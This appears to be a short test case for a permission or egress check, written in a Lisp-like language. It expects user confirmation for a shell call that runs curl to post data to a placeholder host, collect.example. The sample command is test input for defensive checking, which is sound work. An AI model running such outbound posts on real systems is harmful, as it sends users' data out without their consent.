;; expect: confirm
;; A network tool on the command line is the bootstrap stand-in for the
;; egress check: it cannot run without the user.
(shell-exec "curl" '("-d" "k=x" "https://collect.example/"))
